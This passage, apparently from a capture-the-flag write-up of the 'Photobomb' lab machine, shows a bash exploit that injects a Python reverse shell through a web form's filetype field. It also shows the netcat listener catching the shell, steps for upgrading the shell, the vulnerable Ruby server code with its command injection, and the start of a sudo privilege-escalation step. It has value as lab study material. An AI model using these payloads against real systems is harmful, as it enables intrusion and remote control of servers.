</span></span><span style=display:flex><span>CMD<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;python3 -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;</span>$IP<span style=color:#e6db74>\&#34;,</span>$PORT<span style=color:#e6db74>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\&#34;/bin/sh\&#34;)&#39;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Start netcat listner on the background</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Listning at </span>$IP<span style=color:#e6db74>:</span>$PORT<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># nohup nc -dlvp &#34;$PORT&#34; &amp;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Exploit</span>
</span></span><span style=display:flex><span>curl -X POST -H <span style=color:#e6db74>&#34;Authorization: Basic cEgwdDA6YjBNYiE=&#34;</span> -d <span style=color:#e6db74>&#34;photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg;</span>$CMD<span style=color:#e6db74>&amp;dimensions=600x400&#34;</span> <span style=color:#e6db74>&#34;http://photobomb.htb/printer&#34;</span> &amp;&gt;/dev/null <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;[+] Pwned!&#34;</span> <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;[+] Here is your shell&#34;</span> <span style=color:#75715e># &amp;&amp; fg %+</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Terminal 1</span>
</span></span><span style=display:flex><span>goku@exploitation:~$ ./exploit.sh
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Bulding the Payload
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Listning at 10.10.14.2:4444
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Pwned!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Here is your shell
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Terminal 2</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Connection received</span>
</span></span><span style=display:flex><span>goku@exploitation:~$ nc -lvp <span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>4444</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.14.2<span style=color:#f92672>]</span> from photobomb.htb <span style=color:#f92672>[</span>10.10.11.182<span style=color:#f92672>]</span> <span style=color:#ae81ff>53292</span>
</span></span><span style=display:flex><span>$ whoami
</span></span><span style=display:flex><span>whoami
</span></span><span style=display:flex><span>wizard
</span></span><span style=display:flex><span>$ ls
</span></span><span style=display:flex><span>ls
</span></span><span style=display:flex><span>log  photobomb.sh  public  resized_images  server.rb  source_images
</span></span><span style=display:flex><span>$ cd /home/wizard
</span></span><span style=display:flex><span>cd /home/wizard
</span></span><span style=display:flex><span>$ ls
</span></span><span style=display:flex><span>ls
</span></span><span style=display:flex><span>photobomb  user.txt
</span></span></code></pre></div><h3 id=upgrade-legacy-shell-to-interactive-shell>Upgrade legacy shell to interactive shell:</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># In reverse shell</span>
</span></span><span style=display:flex><span>goku@exploitation:~$ nc -lvp <span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>4444</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.14.2<span style=color:#f92672>]</span> from photobomb.htb <span style=color:#f92672>[</span>10.10.11.182<span style=color:#f92672>]</span> <span style=color:#ae81ff>42836</span>
</span></span><span style=display:flex><span>$ python3 -c <span style=color:#e6db74>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span>wizard@photobomb:~/photobomb$
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Ctrl-Z
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># In Kali</span>
</span></span><span style=display:flex><span>goku@exploitation:~$ stty raw -echo
</span></span><span style=display:flex><span>goku@exploitation:~$ fg
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># In reverse shell</span>
</span></span><span style=display:flex><span>wizard@photobomb:~/photobomb$ reset
</span></span><span style=display:flex><span>wizard@photobomb:~/photobomb$ export SHELL<span style=color:#f92672>=</span>bash
</span></span><span style=display:flex><span>wizard@photobomb:~/photobomb$ export TERM<span style=color:#f92672>=</span>xterm-256color
</span></span><span style=display:flex><span>wizard@photobomb:~/photobomb$ stty rows <span style=color:#ae81ff>38</span> columns <span style=color:#ae81ff>116</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>wizard@photobomb:~$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>wizard<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>wizard<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>wizard<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>wizard@photobomb:~$ <span style=color:#75715e># Amazing full tty shell</span>
</span></span></code></pre></div><h3 id=the-vulnerability-root-cause>The vulnerability root cause:</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#75715e># server.rb</span>
</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;sinatra&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>set <span style=color:#e6db74>:public_folder</span>, <span style=color:#e6db74>&#39;public&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>get <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  html <span style=color:#f92672>=</span> <span style=color:#f92672>&lt;&lt;~</span><span style=color:#66d9ef>HTML</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;!</span><span style=color:#66d9ef>DOCTYPE</span> html<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>html<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>head<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span>title<span style=color:#f92672>&gt;</span><span style=color:#66d9ef>Photobomb</span><span style=color:#f92672>&lt;</span><span style=color:#e6db74>/title&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;link type=&#34;text/</span>css<span style=color:#e6db74>&#34; rel=&#34;</span>stylesheet<span style=color:#e6db74>&#34; href=&#34;</span>styles<span style=color:#f92672>.</span>css<span style=color:#e6db74>&#34; media=&#34;</span>all<span style=color:#e6db74>&#34; /&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;script src=&#34;</span>photobomb<span style=color:#f92672>.</span>js<span style=color:#e6db74>&#34;&gt;&lt;/script&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;/head&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;div id=&#34;</span>container<span style=color:#e6db74>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;header&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;h1&gt;&lt;a href=&#34;</span><span style=color:#f92672>/</span><span style=color:#e6db74>&#34;&gt;Photobomb&lt;/a&gt;&lt;/h1&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/header&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;article&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;p&gt;To get started, please &lt;a href=&#34;</span><span style=color:#f92672>/</span>printer<span style=color:#e6db74>&#34; class=&#34;</span>creds<span style=color:#e6db74>&#34;&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/article&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;/body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;/html&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>HTML
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  content_type :html
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  return html
</span></span></span><span style=display:flex><span><span style=color:#e6db74>end
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>get &#39;/printer&#39; do
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  images = &#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  checked = &#39; checked=&#34;</span>checked<span style=color:#e6db74>&#34; &#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  Dir.glob(&#39;public/ui_images/*.jpg&#39;) do |jpg_filename|
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    img_src = jpg_filename.sub(&#39;public/&#39;, &#39;&#39;)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    img_name = jpg_filename.sub(&#39;public/ui_images/&#39;, &#39;&#39;)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    images += &#39;&lt;input type=&#34;</span>radio<span style=color:#e6db74>&#34; name=&#34;</span>photo<span style=color:#e6db74>&#34; value=&#34;</span><span style=color:#e6db74>&#39; + img_name + &#39;</span><span style=color:#e6db74>&#34; id=&#34;</span><span style=color:#e6db74>&#39; + img_name + &#39;</span><span style=color:#e6db74>&#34;&#39; + checked + &#39;/&gt;&lt;label for=&#34;</span><span style=color:#e6db74>&#39; + img_name + &#39;</span><span style=color:#e6db74>&#34; style=&#34;</span>background<span style=color:#f92672>-</span><span style=color:#e6db74>image</span>: url(<span style=color:#e6db74>&#39; + img_src + &#39;</span>)<span style=color:#e6db74>&#34;&gt;&lt;/label&gt;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    checked = &#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  end
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  html = &lt;&lt;~HTML
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;!DOCTYPE html&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;html&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;head&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;title&gt;Photobomb&lt;/title&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;link type=&#34;</span>text<span style=color:#f92672>/</span>css<span style=color:#e6db74>&#34; rel=&#34;</span>stylesheet<span style=color:#e6db74>&#34; href=&#34;</span>styles<span style=color:#f92672>.</span>css<span style=color:#e6db74>&#34; media=&#34;</span>all<span style=color:#e6db74>&#34; /&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;/head&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;div id=&#34;</span>container<span style=color:#e6db74>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;header&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;h1&gt;&lt;a href=&#34;</span><span style=color:#f92672>/</span><span style=color:#e6db74>&#34;&gt;Photobomb&lt;/a&gt;&lt;/h1&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/header&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;form id=&#34;</span>photo<span style=color:#f92672>-</span>form<span style=color:#e6db74>&#34; action=&#34;</span><span style=color:#f92672>/</span>printer<span style=color:#e6db74>&#34; method=&#34;</span>post<span style=color:#e6db74>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;h3&gt;Select an image&lt;/h3&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;fieldset id=&#34;</span>image<span style=color:#f92672>-</span>wrapper<span style=color:#e6db74>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      </span><span style=color:#e6db74>#{</span>images<span style=color:#e6db74>}</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;/fieldset&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;fieldset id=&#34;</span>image<span style=color:#f92672>-</span>settings<span style=color:#e6db74>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;label for=&#34;</span>filetype<span style=color:#e6db74>&#34;&gt;File type&lt;/label&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;select name=&#34;</span>filetype<span style=color:#e6db74>&#34; title=&#34;</span><span style=color:#66d9ef>JPGs</span> work on most printers, but some people think <span style=color:#66d9ef>PNGs</span> give better quality<span style=color:#e6db74>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;option value=&#34;</span>jpg<span style=color:#e6db74>&#34;&gt;JPG&lt;/option&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;option value=&#34;</span>png<span style=color:#e6db74>&#34;&gt;PNG&lt;/option&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;/select&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;div class=&#34;</span>product<span style=color:#f92672>-</span>list<span style=color:#e6db74>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;input type=&#34;</span>radio<span style=color:#e6db74>&#34; name=&#34;</span>dimensions<span style=color:#e6db74>&#34; value=&#34;</span><span style=color:#ae81ff>3000</span>x2000<span style=color:#e6db74>&#34; id=&#34;</span><span style=color:#ae81ff>3000</span>x2000<span style=color:#e6db74>&#34; checked=&#34;</span>checked<span style=color:#e6db74>&#34;/&gt;&lt;label for=&#34;</span><span style=color:#ae81ff>3000</span>x2000<span style=color:#e6db74>&#34;&gt;3000x2000 - mousemat&lt;/label&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;input type=&#34;</span>radio<span style=color:#e6db74>&#34; name=&#34;</span>dimensions<span style=color:#e6db74>&#34; value=&#34;</span><span style=color:#ae81ff>1000</span>x1500<span style=color:#e6db74>&#34; id=&#34;</span><span style=color:#ae81ff>1000</span>x1500<span style=color:#e6db74>&#34;/&gt;&lt;label for=&#34;</span><span style=color:#ae81ff>1000</span>x1500<span style=color:#e6db74>&#34;&gt;1000x1500 - mug&lt;/label&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;input type=&#34;</span>radio<span style=color:#e6db74>&#34; name=&#34;</span>dimensions<span style=color:#e6db74>&#34; value=&#34;</span><span style=color:#ae81ff>600</span>x400<span style=color:#e6db74>&#34; id=&#34;</span><span style=color:#ae81ff>600</span>x400<span style=color:#e6db74>&#34;/&gt;&lt;label for=&#34;</span><span style=color:#ae81ff>600</span>x400<span style=color:#e6db74>&#34;&gt;600x400 - phone cover&lt;/label&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;input type=&#34;</span>radio<span style=color:#e6db74>&#34; name=&#34;</span>dimensions<span style=color:#e6db74>&#34; value=&#34;</span><span style=color:#ae81ff>300</span>x200<span style=color:#e6db74>&#34; id=&#34;</span><span style=color:#ae81ff>300</span>x200<span style=color:#e6db74>&#34;/&gt;&lt;label for=&#34;</span><span style=color:#ae81ff>300</span>x200<span style=color:#e6db74>&#34;&gt;300x200 - keyring&lt;/label&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;input type=&#34;</span>radio<span style=color:#e6db74>&#34; name=&#34;</span>dimensions<span style=color:#e6db74>&#34; value=&#34;</span><span style=color:#ae81ff>150</span>x100<span style=color:#e6db74>&#34; id=&#34;</span><span style=color:#ae81ff>150</span>x100<span style=color:#e6db74>&#34;/&gt;&lt;label for=&#34;</span><span style=color:#ae81ff>150</span>x100<span style=color:#e6db74>&#34;&gt;150x100 - usb stick&lt;/label&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;input type=&#34;</span>radio<span style=color:#e6db74>&#34; name=&#34;</span>dimensions<span style=color:#e6db74>&#34; value=&#34;</span><span style=color:#ae81ff>30</span>x20<span style=color:#e6db74>&#34; id=&#34;</span><span style=color:#ae81ff>30</span>x20<span style=color:#e6db74>&#34;/&gt;&lt;label for=&#34;</span><span style=color:#ae81ff>30</span>x20<span style=color:#e6db74>&#34;&gt;30x20 - micro SD card&lt;/label&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;/fieldset&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;div class=&#34;</span>controls<span style=color:#e6db74>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;button type=&#34;</span>submit<span style=color:#e6db74>&#34;&gt;download photo to print&lt;/button&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/form&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;/body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;/html&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>HTML
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  content_type :html
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  return html
</span></span></span><span style=display:flex><span><span style=color:#e6db74>end
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>post &#39;/printer&#39; do
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  photo = params[:photo]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  filetype = params[:filetype]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  dimensions = params[:dimensions]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  # handle inputs
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  if photo.match(/\.{2}|\//)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    halt 500, &#39;Invalid photo.&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  end
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  if !FileTest.exist?( &#34;</span>source_images<span style=color:#f92672>/</span><span style=color:#e6db74>&#34; + photo )
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    halt 500, &#39;Source photo does not exist.&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  end
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  if !filetype.match(/^(png|jpg)/)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    halt 500, &#39;Invalid filetype.&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  end
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  if !dimensions.match(/^[0-9]+x[0-9]+$/)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    halt 500, &#39;Invalid dimensions.&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  end
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  case filetype
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  when &#39;png&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    content_type &#39;image/png&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  when &#39;jpg&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    content_type &#39;image/jpeg&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  end
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  filename = photo.sub(&#39;.jpg&#39;, &#39;&#39;) + &#39;_&#39; + dimensions + &#39;.&#39; + filetype
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  response[&#39;Content-Disposition&#39;] = &#34;</span>attachment; filename<span style=color:#f92672>=</span><span style=color:#75715e>#{filename}&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>File</span><span style=color:#f92672>.</span>exists?(<span style=color:#e6db74>&#39;resized_images/&#39;</span> <span style=color:#f92672>+</span> filename)
</span></span><span style=display:flex><span>    command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;convert source_images/&#39;</span> <span style=color:#f92672>+</span> photo <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39; -resize &#39;</span> <span style=color:#f92672>+</span> dimensions <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39; resized_images/&#39;</span> <span style=color:#f92672>+</span> filename
</span></span><span style=display:flex><span>    puts <span style=color:#e6db74>&#34;Executing: </span><span style=color:#e6db74>#{</span>command<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    system(command)
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    puts <span style=color:#e6db74>&#34;File already exists.&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> <span style=color:#66d9ef>File</span><span style=color:#f92672>.</span>exists?(<span style=color:#e6db74>&#39;resized_images/&#39;</span> <span style=color:#f92672>+</span> filename)
</span></span><span style=display:flex><span>    halt <span style=color:#ae81ff>200</span>, {}, <span style=color:#66d9ef>IO</span><span style=color:#f92672>.</span>read(<span style=color:#e6db74>&#39;resized_images/&#39;</span> <span style=color:#f92672>+</span> filename)
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>#message = &#39;Failed to generate a copy of &#39; + photo + &#39; resized to &#39; + dimensions + &#39; with filetype &#39; + filetype</span>
</span></span><span style=display:flex><span>  message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Failed to generate a copy of &#39;</span> <span style=color:#f92672>+</span> photo
</span></span><span style=display:flex><span>  halt <span style=color:#ae81ff>500</span>, message
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span></code></pre></div><ul><li>After reviewing the above code:</li><li>Th web application execute a native linux command <code>convert</code> to resize the image</li><li>The web application validates the <code>filetype</code>, if it starts with <code>jpg or png</code> only</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>!</span>filetype<span style=color:#f92672>.</span>match(<span style=color:#e6db74>/^(png|jpg)/</span>)
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span></code></pre></div><ul><li>And then the web application take the <code>filetype</code> and concatenate it with the rest of the command:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span><span style=display:flex><span> command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;convert source_images/&#39;</span> <span style=color:#f92672>+</span> photo <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39; -resize &#39;</span> <span style=color:#f92672>+</span> dimensions <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39; resized_images/&#39;</span> <span style=color:#f92672>+</span> filename
</span></span><span style=display:flex><span>    puts <span style=color:#e6db74>&#34;Executing: </span><span style=color:#e6db74>#{</span>command<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    system(command)
</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
</span></span></code></pre></div><ul><li>On linux we can excute two command in parallel using the <code>;</code> operator:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># command1;command2</span>
</span></span><span style=display:flex><span>ls;pwd
</span></span></code></pre></div><ul><li>Using this concept, we can execute commands on the server by entering the following <code>filetype</code>: <code>jpg;command</code></li></ul><h2 id=privilege-escalation-road-to-root>Privilege Escalation (Road to root):</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>wizard@photobomb:~/photobomb$ sudo -l
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> wizard on photobomb:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User wizard may run the following commands on photobomb:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> SETENV: NOPASSWD: /opt/cleanup.sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
</span></span><span style=display:flex><span>. /opt/.bashrc
</span></span><span style=display:flex><span>cd /home/wizard/photobomb
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># clean up log files</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -s log/photobomb.log <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> ! <span style=color:#f92672>[</span> -L log/photobomb.log <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
</span></span><span style=display:flex><span>  /usr/bin/truncate -s0 log/photobomb.log
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># protect the priceless originals</span>
</span></span><span style=display:flex><span>find source_images -type f -name <span style=color:#e6db74>&#39;*.jpg&#39;</span> -exec chown root:root <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>wizard@photobomb:~/photobomb$
